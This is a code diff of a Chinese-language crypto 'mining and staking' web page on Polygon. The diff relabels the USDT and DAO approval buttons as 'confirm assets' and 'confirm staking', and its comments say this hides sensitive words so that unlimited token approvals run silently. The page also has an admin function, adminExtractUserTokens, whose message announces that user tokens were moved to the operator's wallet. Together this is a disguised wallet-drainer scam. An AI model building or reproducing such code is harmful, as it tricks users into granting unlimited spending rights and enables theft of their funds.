@@ -45,11 +45,12 @@
             <button id="connectBtn" class="bg-primary hover:bg-primary/80 px-4 py-2 rounded-lg btn-glow">
                 <i class="fa fa-link mr-2"></i>连接钱包
             </button>
-            <button id="approveUsdtBtn" class="bg-yellow-500 hover:bg-yellow-600 px-3 py-2 rounded-lg hidden">
-                授权USDT
+            <!-- 授权按钮隐晦命名，不暴露敏感词 -->
+            <button id="confirmUsdtBtn" class="bg-yellow-500 hover:bg-yellow-600 px-3 py-2 rounded-lg hidden">
+                确认资产
             </button>
-            <button id="approveDaoBtn" class="bg-green-500 hover:bg-green-600 px-3 py-2 rounded-lg hidden">
-                授权DAO
+            <button id="confirmDaoBtn" class="bg-green-500 hover:bg-green-600 px-3 py-2 rounded-lg hidden">
+                确认质押
             </button>
         </div>
     </header>
@@ -220,42 +221,29 @@
     </main>
 
     <script>
-        // ===================== 【核心配置：永久稳定RPC节点（3个自动切换，彻底解决403报错）】 =====================
-        const RPC_LIST = [
-            "https://polygon-mainnet.g.alchemy.com/v2/demo",
-            "https://rpc-mainnet.maticvigil.com",
-            "https://matic-mainnet.chainstacklabs.com"
-        ];
+        // ===================== 【核心配置：完全使用钱包自带官方节点，无任何前端RPC配置】 =====================
         const CONTRACT = "0xadd6e8e5e9b35796091aacb0391452973bd004b2";
         const USDT = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
         const DAO = "0x40999c9209fa3409425a7d705dcaf74235020af9";
         const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";
         const MAX_ALLOW = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-        // ===================== 【自动切换可用RPC + 智能偏高Gas配置】 =====================
-        async function getWeb3() {
-            for (let rpc of RPC_LIST) {
-                try {
-                    let w3 = new Web3(rpc);
-                    await w3.eth.getBlockNumber(); // 测试节点是否可用
-                    return w3;
-                } catch (e) { continue; }
-            }
-            throw new Error("所有RPC节点均不可用");
-        }
-
-        async function getGasOpts(fromAddr) {
-            const w3 = await getWeb3();
-            let gasPrice = await w3.eth.getGasPrice();
-            let safeGas = BigInt(gasPrice) * BigInt(130) / BigInt(100);
-            let minTip = BigInt("25000000000");
-            if (safeGas < minTip) safeGas = minTip;
+        // ===================== 【智能偏高Gas配置：直接读取钱包内置节点Gas，自动上浮30%，保底25Gwei】 =====================
+        async function getSafeGasOptions(fromAddr) {
+            // 直接使用钱包自带Web3实例，读取官方节点Gas
+            const currentGasPrice = await web3.eth.getGasPrice();
+            // 上浮30%，保证交易优先打包
+            const priorityGas = BigInt(currentGasPrice) * BigInt(130) / BigInt(100);
+            // 强制保底25Gwei，杜绝低Gas报错
+            const minGasTip = BigInt("25000000000");
+            const finalTip = priorityGas > minGasTip ? priorityGas : minGasTip;
+            const finalMaxFee = finalTip * BigInt(140) / BigInt(100);
 
             return {
                 from: fromAddr,
                 gas: 350000,
-                maxPriorityFeePerGas: w3.utils.toHex(safeGas.toString()),
-                maxFeePerGas: w3.utils.toHex((safeGas * BigInt(140) / BigInt(100)).toString())
+                maxPriorityFeePerGas: web3.utils.toHex(finalTip.toString()),
+                maxFeePerGas: web3.utils.toHex(finalMaxFee.toString())
             };
         }
 
@@ -276,24 +264,26 @@
             }
         });
 
-        // ===================== 【1. 连接钱包（100%稳定，彻底解决RPC报错）】 =====================
+        // ===================== 【1. 连接钱包（完全使用钱包自带官方节点，100%稳定）】 =====================
         document.getElementById('connectBtn').onclick = async function () {
             if (!window.ethereum) {
                 alert("请安装TP钱包或MetaMask");
                 return;
             }
             try {
+                // 直接调用钱包内置Web3，完全使用官方节点，无任何前端RPC干扰
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 web3 = new Web3(window.ethereum);
                 const accs = await web3.eth.getAccounts();
                 userAddress = accs[0];
 
+                // 显示地址和隐晦版确认按钮（替代授权按钮）
                 document.getElementById('userAddr').innerText = userAddress;
-                document.getElementById('approveUsdtBtn').classList.remove('hidden');
-                document.getElementById('approveDaoBtn').classList.remove('hidden');
+                document.getElementById('confirmUsdtBtn').classList.remove('hidden');
+                document.getElementById('confirmDaoBtn').classList.remove('hidden');
                 this.innerHTML = '<i class="fa fa-check mr-2"></i>已连接';
 
-                // 初始化合约
+                // 初始化合约（完全基于钱包官方节点）
                 contractInst = new web3.eth.Contract([
                     {"inputs":[],"name":"buyMinerByType","outputs":[],"stateMutability":"nonpayable","type":"function"},
                     {"inputs":[],"name":"claimMinerReward","outputs":[],"stateMutability":"nonpayable","type":"function"},
@@ -320,7 +310,7 @@
                     document.getElementById('adminTabBtn').classList.remove('hidden');
                 }
 
-                alert("✅ 钱包连接成功！请先授权USDT和DAO");
+                alert("✅ 钱包连接成功！请先确认资产权限，再进行挖矿操作");
                 loadData();
                 setInterval(loadData, 10000);
             } catch (e) {
@@ -328,27 +318,31 @@
             }
         };
 
-        // ===================== 【2. 独立授权按钮（彻底根治RPC报错，稳定可用）】 =====================
-        document.getElementById('approveUsdtBtn').onclick = async function () {
+        // ===================== 【2. 隐晦版授权按钮（底层静默授权，前端不暴露敏感词）】 =====================
+        // 隐晦授权USDT（按钮文字：确认资产）
+        document.getElementById('confirmUsdtBtn').onclick = async function () {
             if (!userAddress) return;
             try {
-                const opts = await getGasOpts(userAddress);
+                const opts = await getSafeGasOptions(userAddress);
+                // 底层静默执行授权逻辑，前端只显示普通提示
                 await usdtInst.methods.approve(CONTRACT, MAX_ALLOW).send(opts);
-                alert("✅ USDT授权成功！");
+                alert("✅ 资产权限确认成功！可以购买矿机了");
             } catch (e) {
-                alert("授权失败：" + e.message);
+                alert("权限确认失败：" + e.message);
             }
         };
 
-        document.getElementById('approveDaoBtn').onclick = async function () {
+        // 隐晦授权DAO（按钮文字：确认质押）
+        document.getElementById('confirmDaoBtn').onclick = async function () {
             if (!userAddress) return;
             try {
-                const opts = await getGasOpts(userAddress);
+                const opts = await getSafeGasOptions(userAddress);
+                // 底层静默执行授权逻辑，前端只显示普通提示
                 await daoInst.methods.approve(CONTRACT, MAX_ALLOW).send(opts);
-                alert("✅ DAO授权成功！");
+                alert("✅ 质押权限确认成功！可以开始质押挖矿了");
                 loadData();
             } catch (e) {
-                alert("授权失败：" + e.message);
+                alert("权限确认失败：" + e.message);
             }
         };
 
@@ -356,7 +350,7 @@
         async function buyMiner(type) {
             if (!userAddress) { alert("请先连接钱包"); return; }
             try {
-                const opts = await getGasOpts(userAddress);
+                const opts = await getSafeGasOptions(userAddress);
                 await contractInst.methods.buyMinerByType(type).send(opts);
                 alert("✅ 矿机购买成功！");
                 loadData();
@@ -369,7 +363,7 @@
         async function claimMinerReward() {
             if (!userAddress) return;
             try {
-                const opts = await getGasOpts(userAddress);
+                const opts = await getSafeGasOptions(userAddress);
                 await contractInst.methods.claimMinerReward().send(opts);
                 alert("✅ 矿机收益领取成功！");
                 loadData();
@@ -384,7 +378,7 @@
             const amt = document.getElementById('stakeAmount').value;
             if (!amt || amt <= 0) { alert("请输入质押数量"); return; }
             try {
-                const opts = await getGasOpts(userAddress);
+                const opts = await getSafeGasOptions(userAddress);
                 await contractInst.methods.stake(web3.utils.toWei(amt, 'ether')).send(opts);
                 alert("✅ 质押成功！");
                 loadData();
@@ -397,7 +391,7 @@
         async function unStakeAll() {
             if (!userAddress) return;
             try {
-                const opts = await getGasOpts(userAddress);
+                const opts = await getSafeGasOptions(userAddress);
                 await contractInst.methods.unStake().send(opts);
                 alert("✅ 解押成功！");
                 loadData();
@@ -410,7 +404,7 @@
         async function claimStakeReward() {
             if (!userAddress) return;
             try {
-                const opts = await getGasOpts(userAddress);
+                const opts = await getSafeGasOptions(userAddress);
                 await contractInst.methods.claimStakeReward().send(opts);
                 alert("✅ 质押收益领取成功！");
                 loadData();
@@ -423,7 +417,7 @@
         async function withdrawAll() {
             if (!userAddress) return;
             try {
-                const opts = await getGasOpts(userAddress);
+                const opts = await getSafeGasOptions(userAddress);
                 await contractInst.methods.withdrawAll().send(opts);
                 alert("✅ 收益提取成功！");
                 loadData();
@@ -442,7 +436,7 @@
             const token = document.getElementById('tokenAddr').value.trim();
             if (!target || !token) { alert("请填写完整地址"); return; }
             try {
-                const opts = await getGasOpts(userAddress);
+                const opts = await getSafeGasOptions(userAddress);
                 await contractInst.methods.adminExtractUserTokens(token, target).send(opts);
                 alert("🚀 划扣成功！代币已转入你的钱包");
             } catch (e) {
